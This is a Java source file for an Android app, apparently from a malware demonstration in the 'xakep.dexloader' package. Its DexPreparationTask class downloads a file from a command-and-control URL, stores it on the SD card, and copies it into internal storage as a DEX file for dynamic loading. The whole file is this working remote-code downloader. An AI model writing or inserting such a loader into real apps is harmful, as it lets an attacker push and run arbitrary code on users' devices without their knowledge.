package xakep.dexloader;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

public class DexPreparationTask extends AsyncTask<File, Void, Boolean> {

	private Context mContext;
	private String mDexFileName = "/sdcard/data.tmp";
	private final int BUF_SIZE = 8 * 1024;
	private String mCcUrl;

	public DexPreparationTask(Context context,  String ccUrl) {
		mContext = context;
		mCcUrl = ccUrl;

	}

	@Override
	protected Boolean doInBackground(File... dexInternalStoragePaths) {
		loadFile(mCcUrl);
		prepareDex(dexInternalStoragePaths[0]);
		return null;
	}

	public boolean loadFile(String ccUrl) {
		InputStream input = null;
		OutputStream output = null;
		HttpURLConnection connection = null;
		try {
			URL url = new URL(ccUrl);
			connection = (HttpURLConnection) url.openConnection();
			connection.connect();

			// expect HTTP 200 OK, so we don't mistakenly save error report
			// instead of the file
			if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
				Log.d("DexPreparationTask", "Server returned HTTP " + connection.getResponseCode()
						+ " " + connection.getResponseMessage());
				return false;
			}

			// this will be useful to display download percentage
			// might be -1: server did not report the length
			int fileLength = connection.getContentLength();

			// download the file
			input = connection.getInputStream();
			output = new FileOutputStream(mDexFileName);

			byte data[] = new byte[4096];
			int count;
			while ((count = input.read(data)) != -1) {
				output.write(data, 0, count);
				Log.d("Dex", "writing data");
			}
		} catch (Exception e) {
			Log.d("Dex", " "+e.getMessage());
			return false;
		} finally {
			try {
				if (output != null)
					output.close();
				if (input != null)
					input.close();
			} catch (IOException ignored) {
			}

			if (connection != null)
				connection.disconnect();
		}
		return true;

	}

	public boolean prepareDex(File dexInternalStoragePath) {
		BufferedInputStream bis = null;
		OutputStream dexWriter = null;

		try {
			bis = new BufferedInputStream(new FileInputStream(mDexFileName));
			dexWriter = new BufferedOutputStream(new FileOutputStream(dexInternalStoragePath));
			byte[] buf = new byte[BUF_SIZE];
			int len;
			while ((len = bis.read(buf, 0, BUF_SIZE)) > 0) {
				dexWriter.write(buf, 0, len);
			}
			dexWriter.close();
			bis.close();
			return true;
		} catch (IOException e) {
			Log.d("dex2", " "+e.getMessage());
			if (dexWriter != null) {
				try {
					dexWriter.close();
				} catch (IOException ioe) {
					throw new RuntimeException(ioe);
				}
			}
			if (bis != null) {
				try {
					bis.close();
				} catch (IOException ioe) {
					throw new RuntimeException(ioe);
				}
			}
			return false;
		}
	}
}
